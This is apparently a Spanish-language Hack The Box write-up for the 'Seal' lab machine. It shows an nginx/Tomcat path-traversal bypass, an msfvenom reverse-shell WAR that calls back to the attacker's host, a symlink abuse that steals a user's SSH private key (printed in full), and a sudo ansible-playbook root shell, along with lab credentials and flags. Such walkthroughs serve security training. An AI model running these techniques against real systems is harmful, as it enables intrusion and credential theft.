---
tags:
title: Seal - Medium (HTB)
permalink: /Seal-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,443,8080 10.129.95.190
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 20:45 -0300
Nmap scan report for 10.129.95.190
Host is up (0.56s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http nginx 1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Seal Market
8080/tcp open  http     Jetty
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.91 seconds
```

## Website SSL

Es una pagina estatica sin nada interesante.

![image-center](/assets/images/Pasted image 20260109205249.png)

## Website / Port 8080

En este puerto corre `GitBucket`, asi me loguee con una cuenta que cree.

![image-center](/assets/images/Pasted image 20260109204524.png)
### Tomcat auth bypass

Veo que se habla de `Tomcat`
![image-center](/assets/images/Pasted image 20260109210541.png)
## Shell as tomcat

Dentro de uno de los archivos del repositorio de `seal_market` hay un commit del archivo `tomcat-users.xml` con credenciales.

![image-center](/assets/images/Pasted image 20260109215646.png)
### Credentials

`tomcat:43MrHBf*z8{Z%`

![image-center](/assets/images/Pasted image 20260109215612.png)
### Tomcat Manager

Como `nginx` probablemente este corriendo `apache`, hay una vulnerabilidad muy conocida en Tomcat, la cual consiste en una especie de `Path Traversal`.

![image-center](/assets/images/Pasted image 20260110024641.png)

En esta famosa imagen, servidores como `Nginx`, una url por ejemplo: `http://test.com/test/..;/test` la interpreta en su totalidad como la url completa, en cambio `Tomcat` la url, la suprime a `http://test.com/test/test`. De esta manera puedo bypassear la validación, ya que intentando acceder al panel de admin de tomcat, no voy a tener éxito, pero usando este payload, si lo logro, y me sale el panel de autenticación, donde use las claves que encontré anteriormente.

![image-center](/assets/images/Pasted image 20260109215730.png)

Generalmente acá es donde un atacante puede subir un `.war` malicioso, el cual me entable un `Reverse shell` a mi maquina.

![image-center](/assets/images/Pasted image 20260110025253.png)
### War upload fail

Por lo que me voy a crear el payload con `msfvenom`.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.19 LPORT=4444 -f war -o revshell.war
Warning: KRB5CCNAME environment variable not supported - unsetting
Payload size: 1102 bytes
Final size of war file: 1102 bytes
Saved as: revshell.war
```

Sin embargo si le doy a `Deploy` falla.

![image-center](/assets/images/Pasted image 20260110025330.png)

Eso, no lo pude solucionar en `Firefox`, así que abrí mi `Chromium` desde Burpsuite, e intercepte la petición del despliegue del archivo, es ahi donde vi, que en la subida del mismo, el payload no aplicaba.

![image-center](/assets/images/Pasted image 20260109230243.png)

Por lo que desde Burpsuite, lo modifique.

![image-center](/assets/images/Pasted image 20260109230508.png)
### Shell

Y luego al ver la respuesta en la pagina, vi q el archivo swe cargo.

![image-center](/assets/images/Pasted image 20260109230526.png)

Solo con darle `Click` sobre el mismo, se ejecuta, y recibo la shell como el usuario `tomcat`.

```bash
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.233.213] 46264
whoami
tomcat
```
## Shell as luis

### Cron task

Viendo el contenido del archivo en la ruta `/opt/backups/playbook`, veo que los archivos en el directorio `/var/lib/tomcat9/webapps/ROOT/admin/dashboard`, se copian en  `/opt/backups/files`, donde luego con `Ansible` se comprimen en formato `.gz`.

```bash
tomcat@seal:/opt/backups/playbook$ cat run.yml 
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

La clave acá, reside en que se para como parámetro `copy_links=yes`, esta opción hace que si en alguno de los archivos, encuentra un link simbolico `(SimLink)`, no copia el enlace, sino que sigue al mismo haciendo una copia del contenido real sobre el que apunta el mismo.
### Simllink abuse

Para hacer una muestra, voy a intentar leer la clave `rsa` del usuario `luis` ya que no puedo ver la flag siendo `tomcat`, asi que me muevo al directorio donde tenga permisos de escritura.

```bash
cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
```

Luego hago el link simbólico de la clave.

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh/id_rsa id_rsa
```

Y veo que efectivamente el backup se realizo en la ruta dada.

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls /opt/backups/archives/
backup-2026-01-10-02:35:32.gz

```

Si me muevo al mismo, para descomprimirlo en la carpeta `/tmp` por ejemplo..

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ cd /opt/backups/archives/
tomcat@seal:/opt/backups/archives$ ls
backup-2026-01-10-02:35:32.gz  backup-2026-01-10-02:36:32.gz
tomcat@seal:/opt/backups/archives$ gunzip -d "backup-2026-01-10-02:35:32.gz"
gzip: backup-2026-01-10-02:35:32: Read-only file system
tomcat@seal:/opt/backups/archives$ gunzip -d "backup-2026-01-10-02:35:32.gz" -c /tmp
```
### id_rsa

Entre todo el output, veo la clave.

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
```
### Auth

La misma la coloque dentro de un archivo y le di permisos de lectura para todos `(chmod 600 id_rsa)`, y luego use la misma como clave de identidad para loguearme por `ssh`.

```bash
ssh luis@seal.htb -i id_rsa 
The authenticity of host seal.htb (10.129.233.213)' can't be established.
ED25519 key fingerprint is: SHA256:CK0IgtHX4isQwWAPna6oD88DnRAM9OacxQExxLSnlL0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

<SNIP>

Last login: Fri May  7 07:00:18 2021 from 10.10.14.2
luis@seal:~$ cat user.txt 
c93cf8feea80e1fa731424b1feefcd33
```
## Shell as root
### Sudo rights

Viendo los privilegios que poseo con `sudo`, veo que puedo ejecutar `ansible-playbook` como `root`.

```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```
### Shell

Verifique si el mismo estaba en [GTFObins](https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo) y si lo estaba, donde en la misma pagina me indica como abusar del mismo para conseguir una shell como `root`.

Básicamente se crea un archivo, con la sintaxis que solicita `Ansible` por ejemplo lo que se usan en el directorio `/opt`. y luego en el la variable `shell` se coloca el comando a ejecutar.

```bash
luis@seal:~$ TF=$(mktemp)
luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
```

Luego con el mismo binario le paso como parámetro el archivo dándome así una consola como `root`.

```bash
luis@seal:~$ sudo /usr/bin/ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] ***********************************************************************************************************

TASK [Gathering Facts] *****************************************************************************************************
ok: [localhost]

TASK [shell] ***************************************************************************************************************
# whoami
root
```

```bash
root@seal:~# cat root.txt 
73280a229f7a17f714592af99053ade7
```

`~Happy Hacking.`